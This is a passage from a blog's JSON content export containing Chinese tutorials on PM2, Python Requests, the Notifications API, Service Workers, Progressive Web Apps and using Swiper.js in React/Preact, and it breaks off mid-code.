object 差不多。 开始它： 1pm2 start ecosystem.config.js 将 PM2 配置成自动启动想要 PM2 在服务器重启后自动运行之前的应用，可以先通过 pm2 start 启动你的应用，然后执行下面的命令： 1pm2 save 这将在~/.pm2目录下生成一个 dump.pm2 文件，里面描述了当前 PM2 上运行着的所有应用。然后执行命令： 1pm2 startup [platform] 注意有必要添加可选参数 platform 以明确告知 PM2 当前的系统环境。这样，下次当服务器重启时，PM2 会自动运行之前保存的应用。 在 PM2 里运行 npm scriptCan pm2 run an ‘npm start’ script 最后Cluster 模块的功能非常强大，使用 PM2 会使它变得更加容易。在 Node 0.10.x 时代 cluster.js 还只是个试验品，但从 Node 0.11.x 开始已经逐渐成熟并开始准备正式发布，当然也包括 Node 0.12.x 版本。强烈推荐使用最新版的 Nodejs 和 PM2，这些产品的贡献者们一直在努力并使它们变得更好。 参考资料 http://nodejs.cn/api/cluster.html https://keymetrics.io/2015/03/26/pm2-clustering-made-easy/ http://pm2.keymetrics.io/docs/usage/cluster-mode/","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"Python Request 使用","slug":"Python/Python Request 使用","date":"2017-07-07T02:19:35.000Z","updated":"2021-06-15T06:10:52.851Z","comments":true,"path":"/stories/2017/07/Python/Python Request 使用/","link":"","permalink":"http://me.lizhooh.com/stories/2017/07/Python/Python Request 使用/","excerpt":"requestsRequests 是用 Python 语言编写，基于 urllib，采用 Apache2 Licensed 开源协议的 HTTP 库。它比 urllib 更加方便，可以节约我们大量的工作，完全满足 HTTP 测试需求。Requests 的哲学是以 PEP 20 的习语为中心开发的，所以它比 urllib 更加 Pythoner。更重要的一点是它支持 Python3 哦！","text":"requestsRequests 是用 Python 语言编写，基于 urllib，采用 Apache2 Licensed 开源协议的 HTTP 库。它比 urllib 更加方便，可以节约我们大量的工作，完全满足 HTTP 测试需求。Requests 的哲学是以 PEP 20 的习语为中心开发的，所以它比 urllib 更加 Pythoner。更重要的一点是它支持 Python3 哦！ 功能特性： 国际化域名和 URL Keep-Alive &amp; 连接池 带持久 Cookie 的会话 浏览器式的 SSL 认证 基本/摘要式的身份认证 优雅的 key/value Cookie 自动解压 自动内容解码 Unicode 响应体 文件分块上传 连接超时 流下载 支持 .netrc 分块请求 线程安全 基本使用安装： 1pip install requests 使用： 1234567import requestsreq = requests.get(url='https://hao.360.cn/') # 最基本的GET请求print(req.status_code) # 获取返回状态req = requests.get(url='https://www.baidu.com//s', params=&#123;'wd': 'python'&#125;) # 带参数的GET请求print(req.url)print(req.text) # 打印解码后的返回数据 http 方法123456requests.get('https://github.com/timeline.json') # GET 请求requests.post('http://httpbin.org/post') # POST 请求requests.put('http://httpbin.org/put') # PUT 请求requests.delete('http://httpbin.org/delete') # DELETE 请求requests.head('http://httpbin.org/get') # HEAD 请求requests.options('http://httpbin.org/get') # OPTIONS 请求 参数12345678910import requestsimport json# getrequests.get('https://baidu.com/s', params=&#123;'wd': 'python'&#125;) # GET参数实例# postrequests.post('http://www.itwhy.org/wp-comments-post.php', data=&#123;'comment': '测试POST'&#125;) # POST参数实例req = requests.post('https://api.github.com/some/endpoint', data=json.dumps(&#123;'some': 'data'&#125;)) # jsonprint(req.json()) 关于 json:json.dumps 将 Python 对象编码成 JSON 字符串json.loads 将已编码的 JSON 字符串解码为 Python 对象 header12345678910import requestsimport jsonreq = requests.post( 'https://api.github.com/some/endpoint', data=&#123;'some': 'data'&#125;, headers=&#123;'content-type': 'application/json'&#125;)print(req.text) 文件数据requests 发送文件。 1234567891011121314import requestsurl = 'http://httpbin.org/post'files = &#123;'file': open('report.xls', 'rb')&#125;res = requests.post(url, files=files)res.text# &#123;# ...# \"files\": &#123;# \"file\": \"&lt;censored...binary...data&gt;\"# &#125;,# ...# &#125; Response 对象12345678910res.status_code # 响应状态码res.raw # 返回原始响应体，也就是 urllib 的 response 对象，使用 res.raw.read() 读取res.content # 字节方式的响应体，会自动为你解码 gzip 和 deflate 压缩res.text # 字符串方式的响应体，会自动根据响应头部的字符编码进行解码res.headers # 以字典对象存储服务器响应头，但是这个字典比较特殊，字典键不区分大小写，若键不存在则返回 Noneres.encoding # HTTP 头部对响应的编码# 特殊方法 #res.json() # requests 中内置的 JSON 解码器res.raise_for_status() # 失败请求(非 200 响应)抛出异常 参考资料 http://cn.python-requests.org/zh_CN/latest/ https://github.com/requests/requests","categories":[{"name":"Python","slug":"Python","permalink":"http://me.lizhooh.com/categories/Python/"}],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Python","slug":"Python","permalink":"http://me.lizhooh.com/tags/Python/"}]},{"title":"PWA 探索 - Notifications","slug":"PWA/PWA 探索 - Notifications","date":"2017-07-06T02:55:15.000Z","updated":"2021-06-15T06:10:52.848Z","comments":true,"path":"/stories/2017/07/PWA/PWA 探索 - Notifications/","link":"","permalink":"http://me.lizhooh.com/stories/2017/07/PWA/PWA 探索 - Notifications/","excerpt":"Notifications：通知推送Notifications API 允许网页或应用程序在系统级别发送在页面外部显示的通知。这样即使应用程序空闲或在后台，Web 应用程序也会向用户发送信息，并且在 Service Worker 中也可以使用。","text":"Notifications：通知推送Notifications API 允许网页或应用程序在系统级别发送在页面外部显示的通知。这样即使应用程序空闲或在后台，Web 应用程序也会向用户发送信息，并且在 Service Worker 中也可以使用。 Notifications 的基本使用下面介绍了 Notifications 的基本使用方法。 创建通知创建通知，使用了 Notification.Notification()，也就是它的构造函数。 let notification = new Notification(title, [options]) 参数： title: 标题 options: 配置项，可选 一个被允许用来设置通知的对象。它包含以下属性： dir : 文字的方向；它的值可以是 auto（自动）, ltr（从左到右）, or rtl（从右到左） lang: 指定通知中所使用的语言。这个字符串必须在 BCP 47 language tag 文档中是有效的。 body: 通知中额外显示的字符串，最多显示 178 个字字符。 tag: 赋予通知一个ID，以便在必要的时候对通知进行刷新、替换或移除。 icon: 一个图片的URL，将被用于显示通知的图标。 tag: 标签，如果您想要一次显示多个通知，那么使用不同的标签，或根本没有标签。 一般来说，在创建之前先检测浏览器是否支持 Notification。 1234// 浏览器不支持if (!('Notification' in window)) &#123; console.log('你的浏览器不支持 Notification');&#125; 判断用户是否允许发送桌面通知，如果运行则发送通知 1234567891011121314151617181920212223242526switch (Notification.permission) &#123; // 用户允许通知 case 'granted': // 创建一个桌面通知 var notification = new Notification(\"起床咯\", &#123; body: '啊呜', icon: 'http://www.easyicon.net/api/resizeApi.php?id=1174379&amp;size=96', &#125;); break; // 用户拒绝 case 'denied': console.log('拒绝发送') break; // 默认 default: // 申请开启桌面通知 Notification.requestPermission(function (permission) &#123; // 创建一个桌面通知 if (permission === \"granted\") &#123; var notification = new Notification(\"起床咯\", &#123; body: '啊呜', icon: 'http://www.easyicon.net/api/resizeApi.php?id=1174379&amp;size=96', &#125;); &#125; &#125;);&#125; Notification 属性通过构造函数创建 Notification 示例，Notification 示例提供对应的属性来读取。 注意：每个通知都对应一个 Notification 示例。 Notification.title只读 在构造方法中指定的 title 参数 Notification.dir只读 通知的文本显示方向 Notification.lang只读 通知的语言 Notification.body只读 通知的文本内容 Notification.tag只读 通知的 ID Notification.icon只读 通知的图标图片的 URL 地址 Notification 方法Notification 只有两个方法： requestPermission(): 方法请求用户当前来源的权限以显示通知 close(): 的方法用于关闭一个以前显示的通知。 Notification 事件Notification 有四个事件： error: 通知发生错误时调用 click: 用户点击通知时调用 close: 通知被关闭时调用 show: 发出通知时调用 在 Service Worker 中使用要在 Service Worker 中使用 Notification，可以参考下面代码： 123456789101112self.addEventListener('push', function(event) &#123; console.log('Received a push message', event); var title = 'Yay a message.'; var body = 'We have received a push message.'; var icon = '/images/icon-192x192.png'; event.waitUntil(self.registration.showNotification(title, &#123; body: body, icon: icon, &#125;));&#125;); 在showNotification会有更多的配置项： 12345678910&#123; \"body\":\"Did you make a $1,000,000 purchase at Dr. Evil...\", \"icon\": \"images/ccard.png\", \"vibrate\": [200, 100, 200, 100, 200, 100, 400], \"tag\": \"request\", \"actions\": [ &#123; \"action\": \"yes\", \"title\": \"Yes\", \"icon\": \"images/yes.png\" &#125;, &#123; \"action\": \"no\", \"title\": \"No\", \"icon\": \"images/no.png\" &#125; ]&#125; 差异性在通知界面上不同的浏览器内核有着不同的差异性，比如 chrome, opera 与 firefox firefox 的桌面通知出现在屏幕的最右上方，接着往下叠加，会一直布满垂直方向的长度，超出的通知不会等待前面的消失后再显示。chrome 的桌面通知出现在屏幕的最右下方，接着往上叠加，最多只能看到三个通知，之后的通知会等待前面的通知消失后再显示。 通知的显示时间，都不相同。 移动端在移动端上，受浏览器兼容性限制，通知类似 Android 的 Notification。 Chrome for Android上的推送通知支持可以从 ServiceWorker 创建通知，但不能从网页创建。因此，下面的代码还是 true，但是在使用 Notification 的构造函数时，会报错。 1234if (!'Notification' in window) &#123; // Notifications aren't supported return;&#125; 目前 Android 和桌面功能检测功能的最佳方法是执行以下操作： 123456789101112131415161718192021function isNewNotificationSupported() &#123; if (!window.Notification || !Notification.requestPermission) return false; if (Notification.permission == 'granted') &#123; throw new Error(`You must only call this \\*before\\* calling Notification.requestPermission(), otherwise this feature detect would bug the user with an actual notification!`); &#125; try &#123; new Notification(''); &#125; catch (e) &#123; // 在 Android 上报错 if (e.name == 'TypeError') return false; &#125; return true;&#125; 实践下面，就制作一个天气预报的桌面通知。 1234567891011121314151617181920var body =`29 °C小雨持续至午后，明晚，小雨持续至今天直至周日，且下周一升温到 32 °C。`;var notification = new Notification(\"广州天气\", &#123; body: body, icon: './icon.png',&#125;);// 设置只显示 5 秒setTimeout(() =&gt; &#123; notification.close();&#125;, 1000 * 5);// 点击时，关闭notification.addEventListener('click', event =&gt; &#123; notification.close();&#125;, false); 参考资料 https://developers.google.cn/web/fundamentals/engage-and-retain/push-notifications/ https://developer.mozilla.org/zh-CN/docs/Web/API/notification","categories":[{"name":"PWA","slug":"PWA","permalink":"http://me.lizhooh.com/categories/PWA/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"PWA","slug":"PWA","permalink":"http://me.lizhooh.com/tags/PWA/"}]},{"title":"PWA 探索 - Service Worker","slug":"PWA/PWA 探索 - Service Worker","date":"2017-07-03T01:00:07.000Z","updated":"2021-06-15T06:10:52.848Z","comments":true,"path":"/stories/2017/07/PWA/PWA 探索 - Service Worker/","link":"","permalink":"http://me.lizhooh.com/stories/2017/07/PWA/PWA 探索 - Service Worker/","excerpt":"前言Service Worker是 PWA 里是必不可少的一部分，学会使用 Service Worker 是构建 PWA 的第一步。 Service Worker：服务工作线程Service Worker是浏览器在后台独立于网页运行的脚本，它打开了通向不需要网页或用户交互的功能的大门。现在，它的用途包括如：推送通知，后台同步，大数据科学计算，机器学习，图像处理，背景后台同步， geofencing（地理围栏定位），拦截和处理网络请求的能力，包括以编程方式来管理被缓存的响应。","text":"前言Service Worker是 PWA 里是必不可少的一部分，学会使用 Service Worker 是构建 PWA 的第一步。 Service Worker：服务工作线程Service Worker是浏览器在后台独立于网页运行的脚本，它打开了通向不需要网页或用户交互的功能的大门。现在，它的用途包括如：推送通知，后台同步，大数据科学计算，机器学习，图像处理，背景后台同步， geofencing（地理围栏定位），拦截和处理网络请求的能力，包括以编程方式来管理被缓存的响应。 Service Worker相关注意事项： 它是一种 JavaScript 工作线程，无法直接访问 DOM。Service Worker 通过响应 postMessage 接口发送的消息来与其控制的页面通信，页面可在必须时对 DOM 执行操作。 Service Worker 是一种可编程网络代理，让您能够控制页面所发送网络请求的处理方式。 Service Worker 在不使用时将被终止，并会在需要的时候重新启动，因此你不能把onfetch和onmessage事件来作为全局依赖处理程序。如果你需要持久话一些信息并在重新启动Service Worker 后使用它，可以使用 IndexedDB API/Local Storage。 出于安全原因，Service Worker 要求要在必须在HTTPS下才能运行。Github Pages 是个用来测试的好地方，因为它就支持 HTTPS。为了便于本地开发，localhost 也被浏览器认为是安全源。 Service Worker 生命周期Service worker有一个独立于你的 Web 页面的生命周期。如果你需要在网站上安装 Serice Worker，你需要通过页面中的 JavaScript 注册它，注册后浏览器会在后台安装 Service Worker。 当我们安装后，会开始激活步骤。Service Worker 升级的这个过程也是一个很好的机会来处理老的缓存。 激活步骤后，Service Worker 将控制所有的页面，纳入它的范围，不过第一次在页面注册 Service Worker 时不会控制页面，直到它再次加载。一旦 Service Worker 在生效，它会处于两种状态之一里：要么 Service Worker 终止来节省内存，要么当页面发起网络请求后，它将处理请求获取和消息事件。 注册与安装下面，我们来看看 Javascript 是如何注册与安装 Service Worker 的： 下面的代码会告诉浏览器你的 Service Worker 脚本在哪里 如果这个 Service Worker 已经被注册过，浏览器会自动忽略上面的代码 使用 register 来注册，register 第一个参数的 url 是相对于 origin，第二个参数是配置对象（scope指定控制的内容的子目录） 1234567891011// 兼容性判断if ('serviceWorker' in navigator) &#123; // sw.js 是 Service Worker 代码 navigator.serviceWorker.register('/sw.js', &#123; scope: '/test/' &#125;).then(registration =&gt; &#123; // 注册成功，输出注册范围 console.log('ServiceWorker registration successful with scope: ', registration.scope); &#125;).catch(err =&gt; &#123; // 注册失败 console.log('ServiceWorker registration failed: ', err); &#125;);&#125; 下面是 sw.js 的代码，做了几样事情： 开启一个缓存 缓存文件 确定所有的资源是否要被缓存 通过 caches.open 打开指定被 cache 的位置 调用 cache.addAll ，将文件数组传入 1234567891011121314151617// keyconst CACHE_NAME = 'my-site-cache-v1';// 缓存的文件const urlsToCache = [ '/', '/styles/main.css', '/script/main.js'];self.addEventListener('install', function(event) &#123; // 缓存成功 event.waitUntil(caches.open(CACHE_NAME).then(cache =&gt; &#123; console.log('Opened cache'); return cache.addAll(urlsToCache); &#125;));&#125;); 如果所有的文件都缓存成功，Service Worker 就安装成功了。如果任何一个文件下载失败，那么安装步骤就会失败。这个方式依赖于你自己指定的资源，但这意味着，你需要非常仔细地确定哪些文件需要被缓存。指定了太多文件的话，会增加失败率。 怎样缓存和返回请求当 Service Worker 安装成功，并且用户浏览了另一个页面或刷新当前页面后，Service Worker 开始接收 fetch 事件。Service Worker 会使用所有 install 步骤时被缓存的资源。 12345678910self.addEventListener('fetch', event =&gt; &#123; event.respondWith(caches.match(event.request).then(response =&gt; &#123; // 缓存命中 - 返回响应 if (response) &#123; return response; &#125; // 没有缓存，重新发起请求 return fetch(event.request); &#125;));&#125;); caches.match()会由内而外对触发抓取事件的网络请求进行评估，并检查以确认它是否位于缓存内。它随即使用已缓存版本作出响应，或者利用 fetch 从网络获取一个副本。response 通过 e.respondWith() 传回至网页。 如果我们想在缓存中添加新的请求缓存，可以通过处理 fetch 请求的 response，将其添加到缓存中即可。 123456789101112131415161718192021222324252627282930self.addEventListener('fetch', function (event) &#123; event.respondWith(caches.match(event.request).then(response =&gt; &#123; // 缓存命中 - 返回响应 if (response) &#123; return response; &#125; // 复制一个请求体 const fetchRequest = event.request.clone(); // 没有缓存 return fetch(fetchRequest).then(response =&gt; &#123; // 检查是否收到有效的响应 if (!response || response.status !== 200 || response.type !== 'basic') &#123; return response; &#125; // 复制请求体 var responseToCache = response.clone(); caches.open(CACHE_NAME) .then(cache =&gt; &#123; // 放进缓存里 cache.put(event.request, responseToCache); &#125;); return response; &#125;); &#125;));&#125;); 代码里做了以下事情： 一旦我们获得一个 response，我们进行如下的检查： 确保 response 有效 检查 response 的状态是 200 确保 response 的类型是 basic 类型的，这说明请求是同源的，这意味着第三方的请求不能被缓存 如果检查通过，会 clone 这个请求。这么做的原因是： 如果 response 是一个 Stream，那么它的 body 只能被使用一次。所以为了让浏览器跟缓存都使用这个 body，我们必须克隆这个 body，一份到浏览器，一份到缓存中缓存 更新 Service WorkerService Worker 总会有要更新的时候。在那时，你需要按照以下步骤来更新： 更新你 Service Worker 的 JavaScript 文件（也就是 sw.js） 当用户浏览你的网站时，浏览器尝试在后台重新下载 Service Worker 的脚本文件。经过对比，只要服务器上的文件和本地文件有一个字节不同（diff），这个文件就认为是新的 之后更新后的 Service Worker 启动并触发 install 事件 此时，当前页面生效的依然是老版本的 Service Worker，新的 Service Worker 会进入 “waiting” 状态 当页面关闭之后，旧的 Service Worker 会被干掉，新的 Service Worker 接管页面（重启生效） 一旦新的 Service Worker 生效后会触发 activate 事件 之后你需要做一些清理老的 cache 和重新设置新的 cache 通常来讲，需要在activate的回调函数中进行 cache 管理，来清理老的 cache。在 activate 进行清理的原因是：如果我们在 install 的时候进行清理，那么老的 Service Worker 仍然在控制页面，他们依赖的缓存就失效了，因此就会突然被停止。 下面的代码会遍历所有的缓存，并删除掉不在 cacheWhitelist 数组（我们定义的缓存白名单）中的缓存： 123456789101112self.addEventListener('activate', function (event) &#123; const cacheWhitelist = ['pages-cache-v1', 'blog-posts-cache-v1']; event.waitUntil(caches.keys().then(cacheNames =&gt; &#123; return Promise.all(cacheNames.map(cacheName =&gt; &#123; if (cacheWhitelist.indexOf(cacheName) === -1) &#123; // 删除缓存 return caches.delete(cacheName); &#125; &#125;)); &#125;));&#125;); 使用 caches.delete(cacheName) 会把整个缓存的 request 都删除，可以使用 cache.delete 进行单个删除： 12345caches.open('v1').then(function(cache) &#123; cache.delete('/images/image.png').then(function(res) &#123; console.log(res); // true &#125;);&#125;); 下面是尝试获取当前 cache 里的所有请求，并删除： 1234567891011caches.open('v1') .then(function(cache) &#123; return cache.matchAll(); &#125;) .then(responses =&gt; &#123; responses.map(res =&gt; &#123; cache.delete(res.url).then(function(status) &#123; console.log(status); // true &#125;); &#125;) &#125;); 注销注册当不想使用 Service Worker 时，可以注销注册。 12345if ('serviceWorker' in navigator) &#123; navigator.serviceWorker.ready.then(registration =&gt; &#123; registration.unregister(); &#125;);&#125; 问题排错 fetch() 的默认值： 当你使用 fetch ，默认请求不会带上 cookies 等身份信息，若需要带上身份信息，请这样调用： 123fetch(url, &#123; credentials: 'include' // 让它带上 cookies&#125;) Non-CORS默认情况下会失败： 默认情况下，从第三方 URL 跨域获取资源将会失败，除非对方支持 CORS。 你可以通过在 Request 中添加 non-CORS 配置来避免失败。 代价是如果这么做，会返回一个“未知”的 response ，你无法获取这个请求是成功还是失败。 12345cache.addAll(urlsToPrefetch.map(urlToPrefetch =&gt; &#123; return new Request(urlToPrefetch, &#123; mode: 'no-cors' &#125;);&#125;)).then(() =&gt; &#123; console.log('All resources have been fetched and cached.');&#125;); Service Worker 实践Service Worker 的基本操作就是：注册，安装，缓存。当然也可以在 SW 里做一些大量科学数据计算。 也就主要分为几步： 注册你的 Worker 安装和激活：填充你的缓存 自定义请求的响应与恢复失败的请求 根据策略更新你的 Service Worker 下面是一个自定义的缓存策略： 定义一个缓存文件列表 定义一个白名单 当 sw.js 更新时，会删除白名单以外的缓存文件，重新再添加到缓存里 当 cacheName 更新时，删除旧的 cacheName 缓存 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364// 缓存文件列表var filesToCache = [ '/', '/index.html', '/favicon.ico', '/js/main.min.js?v=1.4.7',];// 白名单var whiteToCache = [ '/favicon.ico',];// 安装self.addEventListener('install', function (event) &#123; console.log('[ServiceWorker] Install'); event.waitUntil( caches.open(cacheName).then(function (cache) &#123; console.log('[ServiceWorker] Caching app shell'); return cache.matchAll().then(function (responses) &#123; responses.map(function (res, index, list) &#123; var flag = false; for (var i in whiteToCache) &#123; var rfc = whiteToCache[i]; if (res.url.indexOf(rfc) !== -1) &#123; flag = true; break; &#125; &#125; // 不在白名单，删除旧缓存 if (!flag) &#123; cache.delete(res.url).then(function (status) &#123; if (status === true) &#123; console.log('delete cache:', status, res.url); &#125; &#125;); &#125; &#125;); return cache.addAll(filesToCache); &#125;) &#125;).catch(function (err) &#123; console.error('[ServiceWorker] install error: ', err); &#125;) );&#125;);// 重新激活self.addEventListener('activate', function (event) &#123; console.info('[ServiceWorker] Activate'); event.waitUntil(caches.keys().then(cacheNames =&gt; &#123; return Promise.all(cacheNames.map(cn =&gt; &#123; if (cn !== cacheName) &#123; // cacheName 更新后，删除旧的 key return caches.delete(cn); &#125; &#125;)); &#125;)); return self.clients.claim();&#125;); 事件下图展示了 Service Worker 所有支持的事件： 兼容性在兼容性方面，不太乐观：Chrome 能够很好的支持， IE 死都不支持，Safari 也是。 参考资料 https://developer.mozilla.org/zh-CN/docs/Web/API/Cache/match https://developers.google.cn/web/fundamentals/getting-started/primers/service-workers https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers","categories":[{"name":"PWA","slug":"PWA","permalink":"http://me.lizhooh.com/categories/PWA/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"PWA","slug":"PWA","permalink":"http://me.lizhooh.com/tags/PWA/"}]},{"title":"PWA 探索 - 认识","slug":"PWA/PWA 探索 - 认识","date":"2017-07-01T14:35:20.000Z","updated":"2021-06-15T06:10:52.849Z","comments":true,"path":"/stories/2017/07/PWA/PWA 探索 - 认识/","link":"","permalink":"http://me.lizhooh.com/stories/2017/07/PWA/PWA 探索 - 认识/","excerpt":"什么是 PWA ？Google Progressive Web App（渐进式应用）是一种跨平台的应用，它希望将 Web App 的体验提升到和原生 App 一样的流畅。同时，谷歌宣布了PWA将获得与安卓原生应用（Native App）同等的待遇与权限。想象一下，在未来，我们打开手机，假如想要定个外卖，只需要在 Play 里搜一下美团，点开即用，甚至添加到桌面上，不用下载不用加载，这将是智能手机体验的巨大变革。","text":"什么是 PWA ？Google Progressive Web App（渐进式应用）是一种跨平台的应用，它希望将 Web App 的体验提升到和原生 App 一样的流畅。同时，谷歌宣布了PWA将获得与安卓原生应用（Native App）同等的待遇与权限。想象一下，在未来，我们打开手机，假如想要定个外卖，只需要在 Play 里搜一下美团，点开即用，甚至添加到桌面上，不用下载不用加载，这将是智能手机体验的巨大变革。 Progressive Web App带来的体验将网络之长与应用之长相结合。用户在浏览器标签中第一次访问时就能体会到它们的好处，因为不需要进行任何安装。在用户随着时间的推移增进与应用的关系后，其功能会变得越来越强大。它即使在不可靠网络上也能快速加载、能够发送相关推送通知、具有桌面图标，并且可采用顶层全屏体验的方式加载。 这和微信小程序有些类似，但是 PWA 是开放的。PWA 使用 Web 开发技术，并不像微信小程序那样自己实现一个什么 WXML，WXSS 和各种条件限制，还要交 300 元认证费用。 目前移动 Web 网页的体验： 手机桌面入口不够便捷，当然现在可以添加到主屏幕。 没网络就没响应，不具备离线能力。 不像 APP 一样能进行消息推送。 而 PWA 它的特点有： 渐进式的，每个人都可以使用 PWA，无论你使用什么浏览器，因为 PWA 的最终是想渐进式的增强你的用户体验。 多平台，PWA 适用于个人 PC，平板式设备，智能手机，甚至我们不知道的下一种设备。 独立的网络连接，增强式的服务使 PWA 可以在无线环境下或网络及其不稳定的环境下工作。 类本地应用，因为 PWA 就是按照本地 App 来设计的，所以你会觉着你在使用一个本地 App。 保持最新，Serive Worker 使得应用总是保持在最新版本的状态。 安全，PWA 使用 https 进行通信加密，防止了被第三方获取数据以及数据被篡改。 可发现，通过 W3C Manifests.json 缓存的数据和 Serive Worker 的注册，PWA 可以非常容易的搜索引擎里找到打开。 可复用性，通过 PWA 推送的通知，用户可以再次访问 PWA。 可留存性，允许用户将 PWA 在桌面上创建图标，并且不必到应用商店去下载搜索下载应用。 易分享，通过 URL 就可以将 PWA 分享出去，不需要复杂的安装。 相关新闻： 谷歌宣布，PWA 将获得与安卓原生应用同等的待遇与权限： http://www.infoq.com/cn/news/2017/02/PWA-ChromePWA 将与安卓原生平起平坐： https://blog.chromium.org/2017/02/integrating-progressive-web-apps-deeply.html?m=1 (翻墙)Twitter 宣布移动 Web 技术栈迁移到 Node.js，Express，React PWA： https://twitter.com/necolas/status/829128165314306048 (翻墙) 为什么要开发一个 PWA 应用 ?开发一个 PWA 应用是非常有帮助的，可以提高你的用户的使用愉悦读，增加用户参与度并且提高用户转化率。 呈现在用户桌面上 当你的 PWA 应用符合 PWA 标准时，chrome 会提示用户将其放在桌面上。 无论什么情况的网络下，PWA应用都可以可靠的工作 开发人员使 Konga (一个购物网站)在初始化页面的时候使数据加载量减少了 63%，第一次响应用户操作的数据量也减少了 84%。 增加用户的参与度 基于的 Web 通知推送方式帮助 eXtra Electronics (同样是购物网站)他们的用户在这个网站增加了 4 倍的参与度，并且这些用户在这个网站停留了比以往两倍的时间。 提高用户转化 PWA 应用得天独厚的体验方式帮助 AliExpress 将第一次浏览这个网站的新用户的转化次数提高了 104%，在 IOS 端转化次数提高了 82%。 相关的：阿里 PWA 实践，通过 PWA 我们让新用户转化率提升了 104%：https://zhuanlan.zhihu.com/p/26445223Twitter Lite PWA显着增加参与度：https://developers.google.cn/web/showcase/2017/twitter PWA 应用下面这些都是PWA应用：（请在 Android Chrome 57+ 打开，或者在 PC Chrome 57+ 浏览器上按 F12 -&gt; ctrl + shift + m 开启模拟模式 ） PWA 网站大全： https://pwa.rocks/饿了吗 PWA： https://h5.ele.me/msite/阿里 express PWA： https://m.aliexpress.com/preact PWA： https://preactjs.com/ 体验下面，就带大家体验 Preact 的 PWA 应用。 首先，必须安装 Android Chrome v57.0+ App（我的是 v58.0+）在 Chrome 上输入 www.preactjs.com 后点击添加到主屏幕上。 在桌面上打开，PReact PWA，发现体验程度与原生应用媲美，基本察觉不出来。当手机没网络时，PReact PWA 还能使用，因为它使用了离线缓存技术。（可以看到使用了 1.3M 缓存数据） 参考资料 https://developers.google.cn/web/progressive-web-apps/","categories":[{"name":"PWA","slug":"PWA","permalink":"http://me.lizhooh.com/categories/PWA/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"PWA","slug":"PWA","permalink":"http://me.lizhooh.com/tags/PWA/"}]},{"title":"React 与 PReact 中使用 Swiper.js","slug":"React/React/React 与 PReact 中使用 Swiper.js","date":"2017-06-28T09:24:07.000Z","updated":"2021-06-15T06:10:52.876Z","comments":true,"path":"/stories/2017/06/React/React/React 与 PReact 中使用 Swiper.js/","link":"","permalink":"http://me.lizhooh.com/stories/2017/06/React/React/React 与 PReact 中使用 Swiper.js/","excerpt":"Swiper关于 Swiper 的介绍： Swiper 是一个非常强大的视图滑动（幻灯片，轮播图）库，BAT 各大公司都在使用。 Swiper 是纯 javascript 打造的滑动特效插件，面向手机、平板电脑等移动终端。 Swiper 能实现触屏焦点图、触屏 Tab 切换、触屏多图切换等常用效果。 Swiper 开源、免费、稳定、使用简单、功能强大，是架构移动终端网站的重要选择！ 更新：为了方便，我已经封装了一个组件：preact-swiper，使用方式与下面的介绍一样。","text":"Swiper关于 Swiper 的介绍： Swiper 是一个非常强大的视图滑动（幻灯片，轮播图）库，BAT 各大公司都在使用。 Swiper 是纯 javascript 打造的滑动特效插件，面向手机、平板电脑等移动终端。 Swiper 能实现触屏焦点图、触屏 Tab 切换、触屏多图切换等常用效果。 Swiper 开源、免费、稳定、使用简单、功能强大，是架构移动终端网站的重要选择！ 更新：为了方便，我已经封装了一个组件：preact-swiper，使用方式与下面的介绍一样。 1npm install --save preact-swiper@https://github.com/Lizhooh/preact-swiper github: https://github.com/Lizhooh/preact-swiper （欢迎点星） 基本使用引入 css，js 文件： 12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;link href=\"http://cdn.bootcss.com/Swiper/3.4.2/css/swiper.min.css\" rel=\"stylesheet\"&gt; &lt;script src=\"http://cdn.bootcss.com/Swiper/3.4.2/js/swiper.min.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"swiper-container\"&gt; &lt;div class=\"swiper-wrapper\"&gt; &lt;div class=\"swiper-slide\"&gt;Slide 1&lt;/div&gt; &lt;div class=\"swiper-slide\"&gt;Slide 2&lt;/div&gt; &lt;div class=\"swiper-slide\"&gt;Slide 3&lt;/div&gt; &lt;/div&gt; &lt;!-- 如果需要分页器 --&gt; &lt;div class=\"swiper-pagination\"&gt;&lt;/div&gt; &lt;!-- 如果需要导航按钮 --&gt; &lt;div class=\"swiper-button-prev\"&gt;&lt;/div&gt; &lt;div class=\"swiper-button-next\"&gt;&lt;/div&gt; &lt;!-- 如果需要滚动条 --&gt; &lt;div class=\"swiper-scrollbar\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;script&gt; // 初始化 var swiper = new Swiper('.swiper-container', &#123; pagination: '.swiper-pagination', nextButton: '.swiper-button-next', prevButton: '.swiper-button-prev', slidesPerView: 1, paginationClickable: true, spaceBetween: 30, loop: true &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 这样的话，在 Vue 里也很好的嵌入。那么问题来了：如何在 JSX 中使用？ React &amp; PReact要想在 JSX 中使用，就要自己封装一个，基本原理就是取到组件的 原生DOM节点，然后把节点传进new Swiper里，进行初始化工作。 安装： 1npm install --save swiper 基本封装Swiper 提供的功能繁多，具体根据自己需求去封装。 下面是基本的封装： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566import React, &#123; Component &#125; from 'react';// import &#123; h, Component &#125; from 'preact';import Swiper from 'swiper';export default class MySwiper extends Component &#123; static defaultProps = &#123; swiperIsInitialized: () =&gt; &#123; &#125;, options: &#123;&#125;, &#125;; 